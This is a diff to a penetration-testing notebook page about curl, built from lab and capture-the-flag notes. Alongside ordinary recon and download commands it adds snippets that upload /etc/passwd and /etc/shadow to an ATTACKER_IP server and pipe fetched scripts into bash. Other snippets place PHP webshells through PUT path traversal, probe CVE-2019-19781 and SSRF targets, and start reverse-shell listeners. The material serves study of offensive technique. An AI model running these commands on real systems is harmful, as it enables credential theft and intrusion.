@@ -9,6 +9,118 @@ hideFooterPagination: true
 
 {/* Generated from Commands/curl.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## curl: choose the operation and read the result
+
+Request URLs and transfer files.
+
+### What the result establishes
+
+Separate status, headers and body, and preserve the method, cookies and content type needed by the application.
+
+### Prerequisites and common failures
+
+Shell quoting and URL/form encoding happen at different layers; -d sends form data while -F builds multipart content.
+
+### Example 1: Commands
+
+Run in: **Kali**. The upload command requires an uploadserver endpoint, not Python http.server.
+
+```bash
+curl -I http://TARGET_IP/
+curl -o file.zip http://TARGET_IP:8000/file.zip
+curl -X POST http://KALI_IP:8000/upload -F 'files=@file.zip'
+```
+
+### Example 2: Setup Steps
+
+Run in: **Saved lab example**.
+
+```bash
+curl -T /etc/passwd http://<ATTACKER_IP>:9001/SecretUploadDirectory/users.txt
+```
+
+Saved context: [File Transfers for Linux and Windows — Setup Steps](/post-exploitation/file-transfers-cheat-sheet#setup-steps). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Web Upload (Python uploadserver with HTTPS)
+
+Run in: **Saved lab example**.
+
+```bash
+curl -X POST https://<ATTACKER_IP>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+```
+
+Saved context: [File Transfers for Linux and Windows — Web Upload (Python uploadserver with HTTPS)](/post-exploitation/file-transfers-cheat-sheet#web-upload-python-uploadserver-with-https). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: wget and cURL
+
+Run in: **Saved lab example**.
+
+```bash
+wget http://<IP>:<PORT>/file.sh -O /tmp/file.sh       # -O sets output filename
+curl -o /tmp/file.sh http://<IP>:<PORT>/file.sh        # -o (lowercase) sets output filename
+```
+
+Saved context: [File Transfers for Linux and Windows — wget and cURL](/post-exploitation/file-transfers-cheat-sheet#wget-and-curl). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: wget and cURL
+
+Run in: **Saved lab example**.
+
+```bash
+curl http://<IP>/LinEnum.sh | bash                      # download and execute without saving
+wget -qO- http://<IP>/helloworld.py | python3           # -q = quiet, -O- = output to stdout
+```
+
+Saved context: [File Transfers for Linux and Windows — wget and cURL](/post-exploitation/file-transfers-cheat-sheet#wget-and-curl). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: Quick Decision Tree
+
+Run in: **Saved lab example**.
+
+```text
+DOWNLOADING TO WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
+├── Only cmd.exe?       → certutil or bitsadmin
+├── Internal network?   → SMB (impacket-smbserver)
+├── Need fileless?      → IEX + DownloadString
+└── Nothing works?      → Base64 encode/decode via clipboard
+
+DOWNLOADING TO LINUX:
+├── Have curl/wget?     → Use them (simplest)
+├── Need fileless?      → curl | bash  or  wget -qO- | python3
+├── Have Python/PHP?    → Use language one-liners
+├── Nothing available?  → /dev/tcp bash trick
+└── Need encryption?    → OpenSSL s_server/s_client
+
+UPLOADING FROM WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
+├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
+├── Internal network?   → SMB or WebDAV
+└── Nothing works?      → Base64 encode → copy-paste → decode on attacker
+
+UPLOADING FROM LINUX:
+├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
+├── Have SCP?           → scp file user@attacker:/path/
+├── Have Python?        → python3 requests.post one-liner
+└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
+```
+
+Saved context: [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: Detect it (manual)
+
+Run in: **Saved lab example**.
+
+```bash
+curl -sk "https://<TARGET>/vpn/../vpns/cfg/smb.conf"
+```
+
+Saved context: [Citrix NetScaler: CVE-2019-19781 Reference — Detect it (manual)](/enumeration/citrix-netscaler#detect-it-manual). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Request URLs and transfer files.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=curl) · [All tools](/index)
@@ -22,6 +134,13 @@ curl -I http://TARGET_IP/
 curl -o file.zip http://TARGET_IP:8000/file.zip
 curl -X POST http://KALI_IP:8000/upload -F 'files=@file.zip'
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 1: Commands](/enumeration/citrix-netscaler#example-1-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 The upload command requires an uploadserver endpoint, not Python http.server.
 
@@ -43,6 +162,13 @@ The upload command requires an uploadserver endpoint, not Python http.server.
 curl --fail --output federation.xml 'https://FEDERATION_HOST/FederationMetadata/2007-06/FederationMetadata.xml'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [AD FS and SAML triage — Kali — read published federation metadata](/field/adfs#kali-—-read-published-federation-metadata)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Read an identity endpoint in the lab">
@@ -56,6 +182,13 @@ read -rs LAB_TOKEN
 curl --fail-with-body -H "Authorization: Bearer $LAB_TOKEN" 'https://LAB_API_HOST/api/me'
 unset LAB_TOKEN
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [API credential triage — Read an identity endpoint in the lab](/field/api-credentials#read-an-identity-endpoint-in-the-lab)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -76,6 +209,13 @@ find / -name '*.keytab' 2>/dev/null; ls -la /etc/krb5.keytab 2>/dev/null
 ls -la /tmp/krb5cc_* 2>/dev/null; env | grep KRB5
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 5. Credential hunting (Linux)](/cheatsheets/ad-attack-path-worked-example#5-credential-hunting-linux)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="CE (BloodHound Community Edition, Docker) — current/recommended">
@@ -92,6 +232,13 @@ sudo docker-compose -f ~/bh.compose.yml up -d
 sudo docker-compose -f ~/bh.compose.yml logs | grep -i "Initial Password"   # one-time admin pw
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound: Full Reference — CE (BloodHound Community Edition, Docker) — current/recommended](/cheatsheets/bloodhound-complete-guide#ce-bloodhound-community-edition-docker-—-current/recommended)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Detect it (manual)">
@@ -103,6 +250,13 @@ sudo docker-compose -f ~/bh.compose.yml logs | grep -i "Initial Password"   # on
 ```bash
 curl -sk "https://<TARGET>/vpn/../vpns/cfg/smb.conf"
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 7: Detect it (manual)](/enumeration/citrix-netscaler#example-7-detect-it-manual) · [Citrix NetScaler: CVE-2019-19781 Reference — Detect it (manual)](/enumeration/citrix-netscaler#detect-it-manual)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -121,6 +275,13 @@ whatweb https://<TARGET>/
 sudo nmap -p443 -sV --script ssl-cert <TARGET>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — How to spot it on a scan](/enumeration/citrix-netscaler#how-to-spot-it-on-a-scan)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="The Concept of the Attack">
@@ -133,6 +294,13 @@ sudo nmap -p443 -sV --script ssl-cert <TARGET>
 grcic550@htb[/htb]$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — The Concept of the Attack](/modules/common-services/full-reference#the-concept-of-the-attack)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Mistake #1 — Assuming a Successful PUT Upload Equals Code Execution">
@@ -144,6 +312,13 @@ grcic550@htb[/htb]$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<passwo
 ```text
 curl -k -X PUT -H "Host: $target" --basic -u fiona:987654321 --data-binary @shell.php --path-as-is https://$target/shell.php
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Personal Assessment Notes — Mistake #1 — Assuming a Successful PUT Upload Equals Code Execution](/modules/common-services/assessment#mistake-#1-—-assuming-a-successful-put-upload-equals-code-execution)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -159,11 +334,25 @@ curl: Failed to open shell.php
 curl: option --data-binary: error encountered when reading a file
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Personal Assessment Notes — Mistake #2 — Local curl Error Misread as a Server-Side Problem](/modules/common-services/assessment#mistake-#2-—-local-curl-error-misread-as-a-server-side-problem)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Common Services: Personal Assessment Notes**
 
 ```text
 curl -k -H "Host: http://10.129.78.187" --basic -u fiona:987654321 https://10.129.78.187/docs.txt
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Personal Assessment Notes — Mistake #2 — Local curl Error Misread as a Server-Side Problem](/modules/common-services/assessment#mistake-#2-—-local-curl-error-misread-as-a-server-side-problem)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -177,6 +366,13 @@ curl -k -H "Host: http://10.129.78.187" --basic -u fiona:987654321 https://10.12
 curl -k -X PUT -H "Host: http://10.129.78.187" --basic -u fiona:987654321 --data-binary @/home/WhiteWinterWolf/wwwolf-php-webshell/webshell.php --path-as-is https://10.129.78.187/webshell.php
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Personal Assessment Notes — Mistake #3 — Repeating Mistake #1 With a Second Webshell](/modules/common-services/assessment#mistake-#3-—-repeating-mistake-#1-with-a-second-webshell)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Phase 1 — Confirming Arbitrary File Write via CoreFTP&#x27;s HTTP(S) Service">
@@ -189,11 +385,25 @@ curl -k -X PUT -H "Host: http://10.129.78.187" --basic -u fiona:987654321 --data
 curl -k -X PUT -H "Host: $target" --basic -u fiona:987654321 --data-binary "PoC." --path-as-is https://$target/docs.txt
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Personal Assessment Notes — Phase 1 — Confirming Arbitrary File Write via CoreFTP's HTTP(S) Service](/modules/common-services/assessment#phase-1-—-confirming-arbitrary-file-write-via-coreftps-https-service)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Common Services: Personal Assessment Notes**
 
 ```text
 curl -k -H "Host: $target" --basic -u fiona:987654321 https://$target/docs.txt
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Personal Assessment Notes — Phase 1 — Confirming Arbitrary File Write via CoreFTP's HTTP(S) Service](/modules/common-services/assessment#phase-1-—-confirming-arbitrary-file-write-via-coreftps-https-service)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -213,6 +423,13 @@ curl -I https://inlanefreight.com
 curl -I https://www.inlanefreight.com
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [DNS and Web Reconnaissance: Full Workflow — Banner Grabbing with curl](/recon/dns-web-recon-cheat-sheet#banner-grabbing-with-curl)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Querying crt.sh">
@@ -231,6 +448,13 @@ curl -s "https://crt.sh/?q=<domain>&output=json" \
   | sort -u
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [DNS and Web Reconnaissance: Full Workflow — Querying crt.sh](/recon/dns-web-recon-cheat-sheet#querying-crt-sh)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="openid-configuration — What It Leaks">
@@ -242,6 +466,13 @@ curl -s "https://crt.sh/?q=<domain>&output=json" \
 ```bash
 curl -s https://<target>/.well-known/openid-configuration | jq .
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [DNS and Web Reconnaissance: Full Workflow — openid-configuration — What It Leaks](/recon/dns-web-recon-cheat-sheet#openid-configuration-—-what-it-leaks)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -279,6 +510,13 @@ UPLOADING FROM LINUX:
 └── Nothing works?      → Start python3 -m http.server on target, wget from attacker
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 6: Quick Decision Tree](/enumeration/citrix-netscaler#example-6-quick-decision-tree) · [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Setup Steps">
@@ -291,6 +529,13 @@ UPLOADING FROM LINUX:
 curl -T /etc/passwd http://<ATTACKER_IP>:9001/SecretUploadDirectory/users.txt
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 2: Setup Steps](/enumeration/citrix-netscaler#example-2-setup-steps) · [File Transfers for Linux and Windows — Setup Steps](/post-exploitation/file-transfers-cheat-sheet#setup-steps)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Web Upload (Python uploadserver with HTTPS)">
@@ -302,6 +547,13 @@ curl -T /etc/passwd http://<ATTACKER_IP>:9001/SecretUploadDirectory/users.txt
 ```bash
 curl -X POST https://<ATTACKER_IP>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 3: Web Upload (Python uploadserver with HTTPS)](/enumeration/citrix-netscaler#example-3-web-upload-python-uploadserver-with-https) · [File Transfers for Linux and Windows — Web Upload (Python uploadserver with HTTPS)](/post-exploitation/file-transfers-cheat-sheet#web-upload-python-uploadserver-with-https)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -316,12 +568,26 @@ wget http://<IP>:<PORT>/file.sh -O /tmp/file.sh       # -O sets output filename
 curl -o /tmp/file.sh http://<IP>:<PORT>/file.sh        # -o (lowercase) sets output filename
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 4: wget and cURL](/enumeration/citrix-netscaler#example-4-wget-and-curl) · [File Transfers for Linux and Windows — wget and cURL](/post-exploitation/file-transfers-cheat-sheet#wget-and-curl)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **File Transfers for Linux and Windows**
 
 ```bash
 curl http://<IP>/LinEnum.sh | bash                      # download and execute without saving
 wget -qO- http://<IP>/helloworld.py | python3           # -q = quiet, -O- = output to stdout
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 5: wget and cURL](/enumeration/citrix-netscaler#example-5-wget-and-curl) · [File Transfers for Linux and Windows — wget and cURL](/post-exploitation/file-transfers-cheat-sheet#wget-and-curl)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -335,6 +601,13 @@ wget -qO- http://<IP>/helloworld.py | python3           # -q = quiet, -O- = outp
 # find where it landed, then trigger
 curl "http://$IP/uploads/shell.php?c=id"
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Upload Attacks — Bypassing filters](/web/file-upload#bypassing-filters)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -365,6 +638,13 @@ curl -k imaps://<IP> -u '<user>:<pass>'
 curl -k imaps://<IP>/INBOX -u '<user>:<pass>'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — IMAP (Port 143 / 993 SSL)](/enumeration/footprinting-lab-methodology-cheat-sheet#imap-port-143-/-993-ssl)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="POP3 (Port 110 / 995 SSL)">
@@ -393,6 +673,13 @@ QUIT
 curl -k pop3s://<IP> -u '<user>:<pass>'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — POP3 (Port 110 / 995 SSL)](/enumeration/footprinting-lab-methodology-cheat-sheet#pop3-port-110-/-995-ssl)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Phase 0 — External / Infrastructure Recon">
@@ -413,6 +700,13 @@ for i in $(cat subdomainlist); do host $i | grep "has address" | grep <target-do
 for i in $(cat ip-addresses.txt); do shodan host $i; done
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — Phase 0 — External / Infrastructure Recon](/enumeration/footprinting-lab-methodology-cheat-sheet#phase-0-—-external-/-infrastructure-recon)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Exploitation steps">
@@ -424,6 +718,13 @@ for i in $(cat ip-addresses.txt); do shodan host $i; done
 ```bash
 curl http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [HTB Nibbles: Walkthrough and Report — Exploitation steps](/cheatsheets/nibbles#exploitation-steps)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -437,6 +738,13 @@ curl http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php
 curl http://10.129.96.84/
 # <!-- /nibbleblog/ directory. Nothing interesting here! -->
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [HTB Nibbles: Walkthrough and Report — Web enumeration](/cheatsheets/nibbles#web-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -459,6 +767,13 @@ nc -lvnp 4444       # netcat listener (catch reverse shells)
 python3 -m http.server 80            # quick web server to transfer files
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kali Terminal, tmux, zsh, and Vim — 6. Networking / pentest quick commands](/cheatsheets/terminal-tmux-zsh-cheatsheet#6-networking-/-pentest-quick-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Tools">
@@ -475,6 +790,13 @@ curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.s
 ./linpeas.sh -P #Password - Pass a password that will be used with sudo -l and bruteforcing other users
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — Tools](/privesc/linux-privesc-checklist#tools)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Linux Privilege Escalation: Full Checklist**
 
 ```powershell
@@ -483,6 +805,13 @@ curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/ma
 ./lse.sh -l1 # shows interesting information that should help you to privesc
 ./lse.sh -l2 # dump all the information it gathers about the system
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — Tools](/privesc/linux-privesc-checklist#tools)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -500,6 +829,13 @@ python3 odat.py utlfile -s <IP> -d <SID> -U <user> -P <pass> --sysdba \
 curl http://<IP>/testing.txt                                  # verify
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Oracle Database and TNS Enumeration — Example 2: Post-exploitation → RCE (ODAT)](/enumeration/oracle-tns-rdbms-cheat-sheet#example-2-post-exploitation-→-rce-odat) · [Oracle Database and TNS Enumeration — Post-exploitation → RCE (ODAT)](/enumeration/oracle-tns-rdbms-cheat-sheet#post-exploitation-→-rce-odat)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Step 0 — confirm the relay target exists">
@@ -516,6 +852,13 @@ certipy find -u wwhite@inlanefreight.local -p 'package5shores_topher1' -dc-ip 10
 curl -s --max-time 8 -o /dev/null -w "HTTP %{http_code}\n" http://10.129.234.172/certsrv/   # 401 = web enrollment live
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Certificate: PKINIT and Lab Walkthrough — Step 0 — confirm the relay target exists](/password-attacks/pass-the-certificate#step-0-—-confirm-the-relay-target-exists)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Downloading TO a Linux target">
@@ -530,6 +873,13 @@ curl http://<reachable>:8080/tool -o /tmp/tool
 # recursive (a whole dir): wget -r -np -nH --cut-dirs=1 -R "index.html*" http://<reachable>:8080/Linux/
 scp tool jbetty@<DMZ_IP>:/tmp/          # if you have SSH
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — Downloading TO a Linux target](/cheatsheets/pivoting-file-transfer#downloading-to-a-linux-target)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -567,6 +917,13 @@ scp tool jbetty@<DMZ_IP>:/tmp/          # if you have SSH
 └── Either → reverse shell via exploit
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ports, Protocols, and Services by Purpose — Mental Model — "What Do I Use When?"](/reference/master-protocol-service-quick-reference#mental-model-—-what-do-i-use-when)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Quick Decision">
@@ -581,6 +938,13 @@ Linux target   → SCP/SFTP (22) or NFS (2049)
 No auth needed → FTP anonymous or TFTP
 Web server     → wget / curl
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ports, Protocols, and Services by Purpose — Quick Decision](/reference/master-protocol-service-quick-reference#quick-decision)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -598,6 +962,13 @@ http://$IP/fetch?url=http://169.254.169.254/latest/meta-data/   # AWS metadata
 for p in 22 80 3306 6379 8080; do curl -s "http://$IP/fetch?url=http://127.0.0.1:$p"; done
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SSRF (Server-Side Request Forgery) — Earlier notebook reference](/web/ssrf#earlier-notebook-reference)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Docker Install (Greenbone Community Edition)">
@@ -612,6 +983,13 @@ curl -f -O -L https://greenbone.github.io/docs/latest/_static/compose.yaml
 sudo docker compose up -d
 # Access at https://localhost:9392 — admin/admin
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Vulnerability Assessment, Nessus, and OpenVAS — Docker Install (Greenbone Community Edition)](/recon/vulnerability-assessment-cheat-sheet#docker-install-greenbone-community-edition)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -632,6 +1010,13 @@ gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/director
 ffuf -H "Host: FUZZ.$DOMAIN" -u http://$IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <size>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Enumeration — Earlier notebook reference](/web/web-enumeration#earlier-notebook-reference)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="7. TROUBLESHOOTING">
@@ -645,6 +1030,13 @@ Context from the notebook: compose file "not found" filename typo ( bh.compose.y
 ```text
 curl -o
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound: Full Reference — 7. TROUBLESHOOTING](/cheatsheets/bloodhound-complete-guide#7-troubleshooting)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -660,6 +1052,13 @@ Context from the notebook: Manual check curl -sk `https://<T>/vpn/../vpns/cfg/sm
 curl -sk https://<T>/vpn/../vpns/cfg/smb.conf
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Quick reference](/enumeration/citrix-netscaler#quick-reference)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="The essential toolset">
@@ -673,6 +1072,13 @@ Context from the notebook: Web tech fingerprint whatweb ,  nikto ,  curl -I
 ```text
 curl -I
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Getting Started with Penetration Testing — The essential toolset](/getting-started/getting-started-cheat-sheet#the-essential-toolset)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -688,6 +1094,13 @@ Context from the notebook: Read mail over TLS:   openssl s_client -connect &lt;I
 curl -k 'imaps://<IP>' --user <user>:<pass>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ports, Protocols, and Services by Purpose — Signature moves & deep dive](/reference/master-protocol-service-quick-reference#signature-moves-&-deep-dive)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Web Protocols &amp; Recon">
@@ -702,6 +1115,21 @@ Context from the notebook: curl Grab headers, banner grab curl -I &lt;URL>
 curl -I <URL>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ports, Protocols, and Services by Purpose — Web Protocols & Recon](/reference/master-protocol-service-quick-reference#web-protocols-&-recon)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
+
+{/* VAULT_RELATED_END */}
